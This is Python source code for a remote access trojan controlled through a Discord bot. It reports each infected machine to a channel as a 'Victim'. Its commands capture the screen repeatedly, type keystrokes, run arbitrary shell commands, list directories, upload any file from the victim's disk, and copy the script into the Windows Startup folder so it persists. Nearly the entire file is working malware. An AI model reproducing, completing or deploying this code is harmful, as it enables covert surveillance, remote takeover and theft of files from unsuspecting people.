import pyautogui
import discord
from discord.ext import commands
import os
import sys
import platform
import shutil
import time
import webbrowser
import file_coper as cp
import subprocess
import shutil
intents = discord.Intents.all()
client = commands.Bot(command_prefix='>', intents=intents)
id = ID
@client.event
async def on_ready():
    channel = client.get_channel(id)
    if platform.system() == 'Windows':
        embed = discord.Embed(title='Victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
    elif platform.system() == 'Linux':
        embed = discord.Embed(title='victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
    elif platform.system() == 'Macos':
        embed = discord.Embed(title='Victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
    await channel.send(embed=embed)
    cp.main('main.py')

@client.command(help='Screenshot of the screen')
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    channel = client.get_channel(id)
    screenshot.save('screenshot.png')
    with open('screenshot.png', 'rb') as f:
        file = discord.File(f, filename='screenshot.png')
        await channel.send(file=file)
    os.remove('screenshot.png')
@client.command(help='')
async def alert(ctx, *, message):
    channel = client.get_channel(id)
    pyautogui.alert(message)
    await channel.send('Send Alert Message!')

@client.command(help='Write and send a message')
async def write(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send("Writing")
    pyautogui.write(message)
    time.sleep(1)
    pyautogui.press('enter')
    await channel.send(f"I am Write and Send this message {message}")

@client.command(help='Copy Text')
async def copy_text(ctx):
    channel = client.get_channel(id)
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.hotkey('ctrl', 'c')
    await channel.send('I copy this text to clipboard')

@client.command(help='Insert Text')
async def paste_text(ctx):
    pyautogui.hotkey('ctrl', 'v')
    pyautogui.press('enter')

@client.command(help='Open the link')
async def web(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send(f'Open https://{message} wait')
    webbrowser.open("https://" + message)
    await channel.send(f"I am open https://{message} url")

@client.command(help='Device Information')
async def device(ctx):
    channel = client.get_channel(id)
    if platform.system() == 'Windows':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
    elif platform.system() == 'Linux':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
    elif platform.system() == 'Macos':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
    await channel.send(embed=embed)

@client.command(help='Disconnect')
async def disconnected(ctx):
    channel = client.get_channel(id)
    pyautogui.alert(text='im disconnected', title='You are free', button='Bye')
    await channel.send('Disconnected')
    sys.exit(0)

@client.command(help="Entering a command")
async def cmd(ctx, *, command):
    channel = client.get_channel(id)

    with open("console.txt", "w") as f:
        result = subprocess.run(command, stdout=f, stderr=f, shell=True, text=True)

    with open('console.txt', 'rb') as f:
        file = discord.File(f, filename='console.txt')
        await channel.send(file=file)
    os.remove('console.txt')

@client.command(help="File List")
async def ls(ctx, line):
    channel = client.get_channel(id)
    location = line.strip() or 'C:/'
    await channel.send(f"On folder {location} all files is : \n" + str(os.listdir(location)))

@client.command(help="Pick up files from disk")
async def up(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send(file=discord.File(f"{message}"))

@client.command(help="Copy to AutoStart patch")
async def autostart(ctx):
	channel = client.get_channel(id)
	roaming = os.getenv("appdata")
	dst = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	shutil.copy2(sys.argv[0], dst)

	await channel.send('I threw the script into the autorun folder')
@client.command(help="ScreenShot 10 second")
async def video(ctx, count):
    channel = client.get_channel(id)
    start_time = time.time()
    while time.time() - start_time < float(count):
        with open('screenshot.png', 'rb') as fp:
            img = pyautogui.screenshot()
            img.save('screenshot.png')
            file = discord.File(fp, filename='screenshot.png')
            await channel.send(file=file)
    os.remove('screenshot.png')

@client.command(help='Open port')
async def port(port2):
    cp.port(port=port2)


@client.command(help="PC info in .data file")
async def data(ctx):
    channel = client.get_channel(id)
    data = []
    operating_system = platform.system()
    release = platform.release()
    processor = platform.processor() 
    machine = platform.machine()
    node = platform.node()
    data.append(f'Operating System: {operating_system} {release}')
    data.append(f'Processor: {processor}')
    data.append(f'Architecture: {machine}')
    data.append(f'Node Name: {node}')
    with open('info.txt', 'w') as f:
        for line in data:
            f.write(line + '\n')
    file = discord.File(f, filename='info.txt')
    await channel.send(file=file)
    os.remove('info.txt')
#U29ycnkgSSdtIGp1c3QgZG9pbmcgbXkgam9i


client.run('Token Here!')